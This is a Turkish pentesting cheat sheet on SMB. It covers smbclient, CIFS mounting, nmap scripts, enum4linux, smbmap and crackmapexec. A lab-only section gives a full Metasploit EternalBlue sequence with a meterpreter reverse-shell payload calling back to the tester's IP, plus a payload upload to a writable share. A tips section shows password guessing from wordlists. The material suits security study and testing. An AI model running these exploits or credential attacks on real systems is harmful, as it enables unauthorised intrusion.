## 1️⃣ SMB Temelleri

- **SMB (Server Message Block)**: Windows dosya paylaşımı protokolü. Linux’ta `samba`, `smbclient`, `cifs-utils` ile kullanılır.
    
- **Portlar**:
    
    - 139/tcp → NetBIOS Session Service
        
    - 445/tcp → Direct SMB over TCP
        

---

## 2️⃣ SMB Bağlantısı ve Dosya Listeleme

### smbclient (Windows’ta `net use` gibi)

```bash
# Share'e bağlanmak
smbclient //TARGET_IP/ShareName -U username

# Şifresiz denemek
smbclient -L //TARGET_IP -N
```

- `-L` → Share listesini gösterir.
    
- `-U user` → Kullanıcı belirtir.
    
- `-N` → Şifre sormadan deneme.
    

**Örnek:**

```bash
smbclient //192.168.1.10/Public -U guest
```

İçinde gezinmek için:

```bash
ls         # dosya listele
cd folder  # klasöre gir
get file   # indir
put file   # yükle
```

---

## 3️⃣ CIFS ile Mount Etme

```bash
# Mount etmek
sudo mount -t cifs //TARGET_IP/ShareName /mnt/share -o username=user,password=pass,vers=3.0
```

- `/mnt/share` → Local mount point
    
- `vers=2.0` veya `3.0` → SMB versiyonu (server’a göre değişir)
    
- Şifresiz erişim:
    

```bash
sudo mount -t cifs //192.168.1.10/Public /mnt/share -o guest,vers=3.0
```

- Dosya izinlerini yönetmek için:
    

```bash
-o uid=$(id -u),gid=$(id -g)
```

---

## 4️⃣ Nmap ile SMB Tarama

```bash
# SMB portlarını taramak
nmap -p 139,445 TARGET_IP

# SMB servis ve versiyon tespiti
nmap -p 445 --script smb-protocols,smb-os-discovery TARGET_IP

# Tüm SMB scriptleri ile tarama
nmap -p 445 --script smb* TARGET_IP
```

---

## 5️⃣ Enum / Bilgi Toplama Araçları

### enum4linux

```bash
enum4linux TARGET_IP
# Windows kullanıcıları, paylaşımlar, group'lar
```

### crackmapexec (pentest için)

```bash
# SMB login testi
crackmapexec smb TARGET_IP -u user -p pass

# Domain bilgisini çekmek
crackmapexec smb TARGET_IP --shares
```

### smbmap

```bash
smbmap -H TARGET_IP -u username -p password
# Share ve izinleri listele
```

---

## 6️⃣ SMB Exploitation (Sızma Testleri)

> **Not:** Bu bölüm yalnızca laboratuvar/test ortamında kullanılmalıdır.

### Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST TARGET_IP
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
exploit
```

### smbclient ile writable share testi

```bash
smbclient //TARGET_IP/Public -U user
put evil.sh
```

- Writable share → Payload yükleme imkanı.
    

---

## 7️⃣ SMB Versiyon ve Güvenlik

- SMBv1 → Eski, exploit riski yüksek (EternalBlue gibi)
    
- SMBv2/v3 → Daha güvenli, modern Windows ve Linux destekli
    
- Linux’ta versiyon kontrolü:
    

```bash
smbclient -L //TARGET_IP -m SMB2
```

---

## 8️⃣ Pratik İpuçları

- Share isimlerini hızlı görmek için: `smbclient -L //IP -N`
    
- Şifreleri tahmin etmek için: `crackmapexec smb IP -u users.txt -p passwords.txt`
    
- Dosya transferinde hızlı yol: mount edip rsync ile kopya çekmek
    
- smbmap → share üzerinde yetki ve writable kontrolü için ideal
    

---

### 9️⃣ Özet Tablo

|Komut|Amaç|
|---|---|
|`smbclient -L //IP`|Share listesi|
|`smbclient //IP/Share -U user`|Share’e bağlan|
|`mount -t cifs //IP/Share /mnt`|Share’i mount et|
|`enum4linux IP`|Windows info toplama|
|`nmap -p445 --script smb* IP`|SMB tarama|
|`smbmap -H IP -u user -p pass`|Share izinlerini listele|
|`crackmapexec smb IP -u user -p pass`|SMB login test / enum|

---

💡 **Not:** Linux’ta SMB testi yaparken, hem `smbclient` hem `mount` yöntemlerini bilmek çok pratik. Tarama ve exploit için `nmap`, `enum4linux`, `smbmap` ve `crackmapexec` işini kolaylaştırır.

---